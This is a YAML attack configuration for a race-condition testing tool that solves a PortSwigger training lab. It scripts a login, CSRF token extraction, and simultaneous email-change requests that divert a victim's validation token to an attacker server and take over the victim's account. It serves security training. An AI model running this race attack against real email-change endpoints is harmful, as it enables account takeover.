# ============================================================================
# TRECO Configuration: PortSwigger Lab 4 - Single-Endpoint Race (Thread Groups)
# ============================================================================
#
# Lab URL: https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint
#
# Exploits race condition in email change endpoint using thread groups for
# cleaner configuration. Two groups with different emails hit the same endpoint
# simultaneously.
#
# Improvement over traditional mode: Thread groups provide explicit grouping
# with named intents (attacker_email vs victim_email).
#
# Usage:
#   export LAB_HOST="YOUR-LAB-ID.web-security-academy.net"
#   export EXPLOIT_SERVER="YOUR-EXPLOIT-SERVER.exploit-server.net"
#   treco attack.yaml
#
# ============================================================================

metadata:
  name: "PortSwigger Lab 4 - Single-Endpoint Race (Thread Groups)"
  version: "2.0"
  author: "TRECO Team"
  vulnerability: "CWE-362"
  description: |
    Exploits race condition in email change endpoint using thread groups.
    Cleaner syntax with explicit grouping of attacker vs victim email threads.

target:
  host: "{{ env('LAB_HOST', '0a1b2c3d4e5f.web-security-academy.net') }}"
  port: 443
  tls:
    enabled: true
    verify_cert: false
  http:
    follow_redirects: false
  proxy:
    type: http
    host: 127.0.0.1
    port: 8080

entrypoint:
  state: login_page
  input:
    wiener_username: "wiener"
    wiener_password: "peter"
    exploit_server: "{{ env('EXPLOIT_SERVER', 'exploit-server.net') }}"
    attacker_email: "attacker@{{ env('EXPLOIT_SERVER', 'exploit-server.net') }}"
    victim_email: "carlos@ginandjuice.shop"

# ============================================================================
# STATES
# ============================================================================

states:
  login_page:
    description: "Fetch CSRF token from login page"
    
    request: |
      GET /login HTTP/1.1
      Host: {{ target.host }}
    
    extract:
      csrf_token:
        type: xpath
        pattern: "//input[@name='csrf']/@value"
    
    logger:
      on_state_enter: |
        ğŸ” Fetching login page to extract CSRF token...
      
      on_state_leave: |
        âœ… CSRF token extracted: {{ login_page.csrf_token[:16] }}...
    
    next:
      - on_status: 200
        goto: login_wiener

  # Step 1: Login as wiener to get a valid session
  login_wiener:
    description: "Login as wiener to get a session token"
    
    request: |
      POST /login HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/x-www-form-urlencoded
      
      username={{ wiener_username }}&password={{ wiener_password }}&csrf={{ login_page.csrf_token }}
    
    extract:
      session:
        type: cookie
        pattern: session
    
    logger:
      on_state_enter: |
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ” Single-Endpoint Race Attack (Thread Groups)                              â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘  Target:         {{ "%-59s" | format(target.host)                         }} â•‘
        â•‘  Exploit Server: {{ "%-59s" | format(exploit_server)                      }} â•‘
        â•‘  Strategy:       Race 2 email changes with different emails                  â•‘
        â•‘  Mode:           THREAD GROUPS (attacker_email + victim_email)               â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        
        ğŸ”‘ Step 1: Logging in as wiener...
      
      on_state_leave: |
        {% if response.status == 302 %}
        âœ… Logged in as wiener
        ğŸª Session: {{ login_wiener.session[:30] }}...
        {% else %}
        âŒ Login failed! Status: {{ response.status }}
        {% endif %}
    
    next:
      - on_status: 302
        goto: email_change_form

  email_change_form:
    description: "Fetch CSRF token from email change form"
    request: |
      GET /my-account HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ login_wiener.session }}

    extract:
      csrf_token:
        type: xpath
        pattern: "//input[@name='csrf']/@value"

    logger:
      on_state_enter: |
        ğŸ” Fetching email change form to extract CSRF token...
      on_state_leave: |
        âœ… CSRF token extracted: {{ email_change_form.csrf_token }}

    next:
      - on_status: 200
        goto: race_email_change

  # Step 2: Race condition on email change endpoint (Thread Groups)
  race_email_change:
    description: "Race condition with two different emails"
    
    # Empty request - each group has its own
    request: ""
    
    race:
      sync_mechanism: barrier
      connection_strategy: multiplexed
      thread_propagation: single
      
      thread_groups:
        # Group 1: Change to attacker's email (on exploit server)
        - name: attacker_email
          threads: 1
          delay_ms: 0
          
          request: |
            POST /my-account/change-email HTTP/1.1
            Host: {{ target.host }}
            Cookie: session={{ login_wiener.session }}
            Content-Type: application/x-www-form-urlencoded
            
            email={{ attacker_email }}&csrf={{ email_change_form.csrf_token }}
          
          variables:
            email_value: "{{ attacker_email }}"
            purpose: "Set attacker email on account"
        
        # Group 2: Change to victim's email (carlos)
        - name: victim_email
          threads: 1
          delay_ms: 0
          
          request: |
            POST /my-account/change-email HTTP/1.1
            Host: {{ target.host }}
            Cookie: session={{ login_wiener.session }}
            Content-Type: application/x-www-form-urlencoded
            
            email={{ victim_email }}&csrf={{ email_change_form.csrf_token }}
          
          variables:
            email_value: "{{ victim_email }}"
            purpose: "Trigger victim's email validation"
    
    logger:
      on_state_enter: |
        
        âš¡ Step 2: Racing email change requests...
        
        Group 1 (attacker_email): email={{ attacker_email }}
        Group 2 (victim_email):   email={{ victim_email }}
        
        ğŸ¯ Expected: Victim's validation token sent to attacker's server!
        
      
      on_thread_enter: |
        ğŸš€ [{{ group.name }}] {{ group.variables.purpose }}
      
      on_thread_leave: |
        {% if response.status_code == 302 or response.status_code == 200 %}
        âœ… [{{ group.name }}] Email change to "{{ group.variables.email_value }}" - HTTP {{ response.status_code }} ({{ "%.2f" | format(timing_ms) }}ms)
        {% else %}
        âŒ [{{ group.name }}] Failed to change to "{{ group.variables.email_value }}" - HTTP {{ response.status_code }}
        {% endif %}
      
      on_state_leave: |
        
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ“Š RACE ATTACK RESULTS                                                      â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        
        Race completed. Both email change requests were sent simultaneously.
        
        {% set timing_diff = (race_email_change | map(attribute='timing_ms') | max) - (race_email_change | map(attribute='timing_ms') | min) %}
        â±ï¸  Timing window: {{ "%.2f" | format(timing_diff) }}ms between requests
        
        ğŸ’¡ Next steps to solve the lab:
        
        1. Go to your exploit server: https://{{ exploit_server }}
        2. Click "Access log" to view incoming requests
        3. Look for a GET request with a token parameter:
           GET /?token=XXXXXXXXXXXXX
        
        4. If you see carlos's validation request:
           âœ… The race succeeded!
           â†’ Copy the token value
           â†’ Visit: https://{{ target.host }}/my-account/change-email?token=XXXXX
           â†’ This confirms carlos's email to YOUR exploit server
           â†’ Lab solved! ğŸ†
        
        5. If you don't see the token:
           âš ï¸  The race timing was off
           â†’ Run the attack again (timing variance is normal)
        
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ¯ HOW THIS WORKS                                                           â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘  Due to the race condition, one request completes while the other is         â•‘
        â•‘  being processed. This causes:                                               â•‘
        â•‘                                                                              â•‘
        â•‘  1. Your email (attacker@exploit-server) is set on wiener's account          â•‘
        â•‘  2. Carlos's email validation is still being processed                       â•‘
        â•‘  3. Validation token is sent to YOUR exploit server (race!)                  â•‘
        â•‘  4. You can use that token to confirm carlos's email change                  â•‘
        â•‘  5. With confirmed email, you can take over carlos's account                 â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    
    next:
      - goto: verify_exploit_server

  # Step 3: Verify exploit server received the token
  verify_exploit_server:
    description: "Instructions for completing the lab"
    
    request: |
      GET / HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ login_wiener.session }}
    
    logger:
      on_state_enter: |
        
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ“‹ MANUAL STEPS TO COMPLETE THE LAB                                         â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘                                                                              â•‘
        â•‘  1. Visit your exploit server: https://{{ exploit_server }}                  â•‘
        â•‘                                                                              â•‘
        â•‘  2. Click "Access log" button                                                â•‘
        â•‘                                                                              â•‘
        â•‘  3. Look for a GET request with token parameter:                             â•‘
        â•‘     GET /?token=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX                             â•‘
        â•‘                                                                              â•‘
        â•‘  4. Copy the full token value                                                â•‘
        â•‘                                                                              â•‘
        â•‘  5. Visit the confirmation URL:                                              â•‘
        â•‘     https://{{ target.host }}/my-account/change-email?token=XXXXXXX          â•‘
        â•‘                                                                              â•‘
        â•‘  6. This confirms carlos's email change to your server!                      â•‘
        â•‘                                                                              â•‘
        â•‘  7. Lab should be marked as solved! ğŸ†                                       â•‘
        â•‘                                                                              â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        
        âš¡ If you don't see the token in the access log:
           â†’ Run the attack again (race timing has variance)
           â†’ Success rate is typically 30-70% due to race window timing